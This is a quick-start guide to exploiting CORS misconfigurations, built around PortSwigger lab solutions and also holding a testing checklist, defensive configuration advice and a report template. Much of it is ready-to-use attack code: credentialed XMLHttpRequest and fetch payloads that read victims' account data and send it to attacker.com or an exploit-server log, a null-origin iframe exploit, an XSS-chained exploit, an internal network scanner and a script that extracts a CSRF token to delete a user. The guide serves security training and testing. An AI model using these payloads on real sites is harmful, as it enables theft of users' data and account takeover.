# CORS (Cross-Origin Resource Sharing) - Quick Start Guide

## 🎯 Quick Reference

### What is CORS?
Browser mechanism that allows controlled cross-origin resource access. When misconfigured, attackers can steal sensitive data from authenticated users.

### Critical Headers
- `Access-Control-Allow-Origin`: Which origins can access resources
- `Access-Control-Allow-Credentials`: Whether cookies/auth are allowed
- `Origin`: Browser-set header indicating request origin

---

## ⚡ 60-Second Vulnerability Check

### Step 1: Find Authenticated Endpoint
```bash
# Login and browse application
# Look for API endpoints returning sensitive data
```

### Step 2: Test with Burp Repeater
```http
GET /api/userdata HTTP/1.1
Host: victim.com
Origin: https://evil.com
Cookie: session=abc123
```

### Step 3: Check Response
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com  ← Vulnerable!
Access-Control-Allow-Credentials: true         ← Critical!
```

**If both headers present = EXPLOITABLE**

---

## 🚀 Lab Speed-Run Guide

### Lab 1: Basic Origin Reflection (2 minutes)

**Exploit:**
```html
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.onload = function() { location = '/log?key=' + this.responseText; };
req.send();
</script>
```

**Steps:**
1. Login as `wiener:peter`, view /accountDetails in Burp
2. Add `Origin: https://evil.com` in Repeater → verify reflection
3. Paste exploit in exploit server → replace LAB-ID
4. Deliver to victim → check access log → submit API key

---

### Lab 2: Null Origin (3 minutes)

**Exploit:**
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="<script>
var req = new XMLHttpRequest();
req.open('get', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.onload = function() { location = 'https://EXPLOIT-ID.exploit-server.net/log?key=' + encodeURIComponent(this.responseText); };
req.send();
</script>"></iframe>
```

**Key Points:**
- Sandbox attribute creates `null` origin
- **Don't include** `allow-same-origin` flag
- Use `encodeURIComponent()` for data

**Steps:**
1. Test with `Origin: null` in Repeater
2. Deploy exploit with sandboxed iframe
3. Deliver and retrieve admin key from logs

---

### Lab 3: Trusted Insecure Protocols (5 minutes)

**Exploit:**
```html
<script>
document.location = "http://stock.LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.onload = function() { location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText; }; req.send();%3c/script>&storeId=1"
</script>
```

**Attack Chain:**
1. XSS on HTTP subdomain (stock checker)
2. CORS trusts HTTP subdomain
3. XSS payload steals data from HTTPS main domain

**Steps:**
1. Find XSS in `productId` parameter on stock subdomain
2. Inject CORS payload via XSS
3. Encode `</script>` as `%3c/script>`
4. Replace LAB-ID (3 places!) and EXPLOIT-ID

---

### Lab 4: Internal Network Pivot (10 minutes)

**Stage 1 - Network Scan:**
```html
<script>
for(var i = 1; i <= 254; i++) {
    var req = new XMLHttpRequest();
    req.open('get', 'http://192.168.0.' + i + ':8080/', true);
    req.onload = function() {
        location = '/scan?ip=' + this.responseURL;
    };
    req.send();
}
</script>
```

**Stage 2 - Exploit (once IP found, e.g., 192.168.0.141):**
```html
<script>
var exploit = encodeURIComponent(`
    var req = new XMLHttpRequest();
    req.open('get', '/admin', true);
    req.onload = function() {
        var csrf = req.responseText.match(/name="csrf" value="([^"]+)"/)[1];
        var formData = new FormData();
        formData.append('csrf', csrf);
        formData.append('username', 'carlos');
        var delReq = new XMLHttpRequest();
        delReq.open('post', '/admin/delete', true);
        delReq.withCredentials = true;
        delReq.send(formData);
    };
    req.send();
`);

location = 'http://192.168.0.141:8080/login?username="/><script>' + exploit + '</scr' + 'ipt><x y="';
</script>
```

**Steps:**
1. Deploy scan payload → get internal IP from logs
2. Deploy exploit payload with discovered IP
3. XSS extracts CSRF token and deletes user

---

## 🔥 Common Payloads

### Basic Data Theft
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/log?data=' + btoa(this.responseText));
};
req.send();
```

### With Error Handling
```javascript
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/data', true);
req.withCredentials = true;
req.onload = function() {
    if (this.status === 200) {
        navigator.sendBeacon('https://attacker.com/log', this.responseText);
    }
};
req.onerror = function() {
    console.log('CORS blocked or network error');
};
req.send();
```

### POST Request with CORS
```javascript
var req = new XMLHttpRequest();
req.open('post', 'https://victim.com/api/action', true);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'application/json');
req.onload = function() {
    fetch('https://attacker.com/log?response=' + this.responseText);
};
req.send(JSON.stringify({ action: 'malicious' }));
```

---

## 🧪 Testing Checklist

### Manual Testing (Burp Repeater)

```
Test #1: Arbitrary Origin
Origin: https://evil.com
✓ Check if reflected in Access-Control-Allow-Origin

Test #2: Null Origin
Origin: null
✓ Check if explicitly allowed

Test #3: Protocol Downgrade
Origin: http://subdomain.victim.com
✓ From HTTPS app, test HTTP origin

Test #4: Subdomain
Origin: https://attacker.victim.com
✓ Test if subdomains trusted

Test #5: Domain Suffix
Origin: https://victim.com.evil.com
✓ Test regex bypass

Test #6: Domain Prefix
Origin: https://evilsvictim.com
✓ Test prefix matching

Test #7: Character Bypass
Origin: https://victimXcom
✓ Test if . is treated as wildcard
```

### Critical Indicators

**VULNERABLE if:**
- ✅ `Access-Control-Allow-Origin` reflects arbitrary origin
- ✅ `Access-Control-Allow-Credentials: true`
- ✅ Response contains sensitive data

**NOT EXPLOITABLE if:**
- ❌ `Access-Control-Allow-Origin: *` (no credentials)
- ❌ `Access-Control-Allow-Credentials` is false/absent
- ❌ Static whitelist of trusted origins only

---

## 🎣 Exploitation Workflow

### 1. Reconnaissance
```bash
# Proxy traffic through Burp
# Login to application
# Identify endpoints returning:
- User data (email, API keys, tokens)
- Account details
- Sensitive business data
- Admin functionality
```

### 2. Vulnerability Confirmation
```bash
# In Burp Repeater:
1. Add Origin header with evil domain
2. Verify reflection in response
3. Check Access-Control-Allow-Credentials
4. Confirm sensitive data in response body
```

### 3. Exploit Development
```html
<!-- Host on attacker server -->
<script>
// Customize for target endpoint
var req = new XMLHttpRequest();
req.open('get', 'TARGET_URL', true);
req.withCredentials = true;
req.onload = function() {
    // Exfiltrate data
    fetch('ATTACKER_LOG_URL?data=' + btoa(this.responseText));
};
req.send();
</script>
```

### 4. Delivery
```
Methods:
- Social engineering (phishing)
- Malicious ads
- Compromised websites
- XSS on trusted domains
```

---

## 🛠️ Burp Suite Quick Setup

### Extension Installation
1. Extender → BApp Store
2. Install **"CORS*, Additional CORS Checks"**
3. Or **"Trusted Domain CORS Scanner"**

### Automated Scanning
1. Right-click target in Site Map
2. Scan → CORS checks enabled
3. Dashboard → Review findings

### Manual Testing Setup
1. Proxy → Intercept: On
2. Browse to authenticated endpoints
3. Right-click request → Send to Repeater
4. Modify Origin header
5. Analyze response headers

---

## 🔍 Bypass Techniques

### 1. Null Origin via Sandbox
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="...">
```

### 2. File Protocol
```html
<!-- Save as local file, trick user to open -->
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api', true);
req.withCredentials = true;
req.send();
</script>
```

### 3. Data URL
```html
<iframe src="data:text/html,<script>...</script>">
```

### 4. Regex Bypass Patterns
```
Target regex: /victim\.com/

Bypasses:
- victim.com.attacker.com (missing end anchor $)
- attackervictim.com (missing start anchor ^)
- victimXcom.attacker.com (. matches any character)
```

### 5. Subdomain Takeover
```
1. Find abandoned subdomain (old-api.victim.com)
2. Register/takeover (AWS S3, GitHub Pages, etc.)
3. Host exploit code
4. Profit from trusted subdomain
```

### 6. XSS on Trusted Origin
```
If victim.com trusts subdomain.victim.com:
1. Find XSS on subdomain
2. Inject CORS exploitation code
3. Bypass same-origin policy
```

---

## 🚨 Common Mistakes

### ❌ Exploit Not Working

**Forgot `withCredentials: true`**
```javascript
// Wrong - no cookies sent
req.open('get', url, true);

// Correct
req.open('get', url, true);
req.withCredentials = true;
```

**Wrong Origin Context**
```javascript
// Exploit must be hosted on different origin
// Test from exploit server, not victim domain
```

**Not URL Encoding**
```javascript
// Wrong
location = '/log?data=' + responseText;

// Correct
location = '/log?data=' + encodeURIComponent(responseText);
```

### ❌ Sandbox Issues

**Including allow-same-origin**
```html
<!-- Wrong - gets parent origin, not null -->
<iframe sandbox="allow-scripts allow-same-origin">

<!-- Correct - forces null origin -->
<iframe sandbox="allow-scripts allow-top-navigation">
```

### ❌ Lab ID Placeholders

**Always replace ALL occurrences:**
- LAB-ID (may appear 2-3 times)
- EXPLOIT-ID
- Check script tag splitting: `</scr'+'ipt>`

---

## 📊 Risk Assessment

### Severity: **HIGH to CRITICAL**

**Impact:**
- Complete account takeover
- Sensitive data theft (API keys, tokens, PII)
- Privilege escalation
- Business logic bypass

**Likelihood:**
- Common misconfiguration
- Easy to exploit
- No user interaction beyond visit
- Scales to mass exploitation

**CVSS Example:**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.3 (Critical)
```

---

## 🛡️ Defense Quick Reference

### Secure Configuration

**✅ DO:**
```javascript
// Explicit whitelist
const allowedOrigins = ['https://trusted-domain.com'];
if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
}

// Protocol-aware regex with anchors
if (origin.match(/^https:\/\/[\w-]+\.victim\.com$/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
}
```

**❌ DON'T:**
```javascript
// Reflect without validation
res.setHeader('Access-Control-Allow-Origin', request.headers.origin);

// Wildcard with credentials
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Flawed regex
if (origin.match(/victim\.com/)) { ... }  // No anchors!
```

### Essential Headers

```http
# Secure CORS response
Access-Control-Allow-Origin: https://trusted-domain.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 600
Vary: Origin

# Additional security
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
```

---

## 📋 Reporting Template

### Vulnerability Report

**Title:** Cross-Origin Resource Sharing (CORS) Misconfiguration

**Severity:** High / Critical

**Description:**
The application reflects arbitrary origins in the `Access-Control-Allow-Origin` header without validation, combined with `Access-Control-Allow-Credentials: true`. This allows attackers to steal sensitive authenticated data.

**Affected Endpoints:**
- https://victim.com/api/accountDetails
- https://victim.com/api/userdata

**Proof of Concept:**
```http
GET /api/accountDetails HTTP/1.1
Host: victim.com
Origin: https://attacker.com
Cookie: session=valid-session-token

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"apikey": "sensitive-api-key"}
```

**Exploitation:**
```html
<script>
var req = new XMLHttpRequest();
req.open('get', 'https://victim.com/api/accountDetails', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/exfil?data=' + btoa(this.responseText));
};
req.send();
</script>
```

**Impact:**
- Complete account takeover
- API key theft
- Sensitive data exfiltration
- Affects all authenticated users

**Remediation:**
1. Implement explicit origin whitelist
2. Validate protocol (HTTPS only)
3. Use anchored regex: `/^https:\/\/trusted\.com$/`
4. Never trust `null` origin in production
5. Add `Vary: Origin` header for caching
6. Regular security audits of CORS policies

**References:**
- CWE-942: Overly Permissive Cross-domain Whitelist
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing

---

## 🔗 Quick Links

- [PortSwigger CORS Labs](https://portswigger.net/web-security/cors)
- [OWASP CORS Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Fetch Standard](https://fetch.spec.whatwg.org/#http-cors-protocol)

---

## 💡 Pro Tips

1. **Always test with credentials**: CORS without credentials is usually not exploitable
2. **Check Vary header**: Missing `Vary: Origin` can lead to cache poisoning
3. **Test all protocols**: HTTP, HTTPS, file://, data:, null
4. **Subdomain enumeration**: Find and test all subdomains for XSS + CORS chains
5. **Internal networks**: Don't forget 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12
6. **Browser DevTools**: Network tab shows CORS errors in console
7. **Preflight requests**: Complex requests trigger OPTIONS preflight - test both
8. **Regex anchors**: Always check for missing `^` and `$` in origin validation
9. **Script splitting**: Use `</scr'+'ipt>` to avoid closing outer script tags
10. **Base64 encoding**: Use `btoa()` for binary-safe data exfiltration

---

## ⚡ One-Liners

### Test with cURL
```bash
curl -H "Origin: https://evil.com" -H "Cookie: session=abc" -i https://victim.com/api
```

### Quick Burp Test
```
1. Ctrl+R (Send to Repeater)
2. Add: Origin: https://evil.com
3. Send
4. Check response headers
```

### Minimal PoC
```html
<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?data='+btoa(d)))</script>
```

### Null Origin Iframe
```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>"></iframe>
```

---

**🎓 Master CORS vulnerabilities through practice!**

**Next Steps:**
1. Complete all 4 PortSwigger CORS labs
2. Practice with different frameworks (Express, Flask, PHP)
3. Set up vulnerable environment for testing
4. Review real-world CVEs and bug bounty reports
5. Read the complete guide: `cors-portswigger-labs-complete.md`

---

*For comprehensive exploitation techniques, see the full guide.*
